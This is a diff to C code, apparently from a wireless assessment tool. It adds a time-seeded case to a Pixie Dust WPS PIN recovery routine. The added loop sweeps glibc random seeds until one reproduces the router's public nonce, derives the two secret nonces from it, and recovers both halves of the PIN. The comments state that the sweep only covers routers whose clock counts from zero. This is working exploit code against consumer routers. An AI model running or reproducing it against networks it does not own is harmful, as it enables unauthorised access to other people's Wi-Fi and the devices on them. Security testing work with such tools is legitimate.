@@ -234,4 +234,45 @@ void bas_pixie_run(const bas_pixie_in_t *in, bas_pixie_out_t *out)
         out->pin   = (uint32_t)first * 10000u + (uint32_t)second;
         return;
     }
+
+    /* The clock-seeded class. The registrar draws its public nonce and then
+     * both secrets from one generator, back to back, so the nonce it sent in
+     * the clear identifies the seed and the seed yields the secrets.
+     *
+     * The seed is the registrar's clock, which is not observable from here.
+     * A router that has never reached an NTP server counts from zero, so its
+     * seed is simply its uptime in seconds -- that window is small and is
+     * swept here. A router with real time has a seed near the true epoch,
+     * which this cannot know, and the sweep will not find it. That is a
+     * limitation of running on the device rather than beside a capture, and
+     * it is stated rather than hidden: a negative result from this class
+     * means "not found in the swept window", never "not vulnerable". */
+    for (uint32_t seed = 0; seed < BAS_PIXIE_SEED_SWEEP; seed++) {
+        bas_glibc_rng_t g;
+        uint8_t probe[BAS_PIXIE_NONCE];
+        bas_glibc_srand(&g, seed);
+        bas_glibc_bytes(&g, probe, sizeof(probe));
+        if (memcmp(probe, in->rnonce, BAS_PIXIE_NONCE) != 0) {
+            continue;
+        }
+        /* The seed is identified. The two secrets are the next draws. */
+        uint8_t rs1[BAS_PIXIE_NONCE], rs2[BAS_PIXIE_NONCE];
+        bas_glibc_bytes(&g, rs1, sizeof(rs1));
+        bas_glibc_bytes(&g, rs2, sizeof(rs2));
+
+        int first = bas_pixie_first_half(in, rs1);
+        out->tried += 10000u;
+        if (first < 0) {
+            break;                    /* right seed, wrong model: stop */
+        }
+        int second = bas_pixie_second_half(in, rs2, (uint16_t)first);
+        out->tried += 1000u;
+        if (second < 0) {
+            break;
+        }
+        out->found = true;
+        out->vuln  = BAS_PIXIE_PRNG_TIME;
+        out->pin   = (uint32_t)first * 10000u + (uint32_t)second;
+        return;
+    }
 }
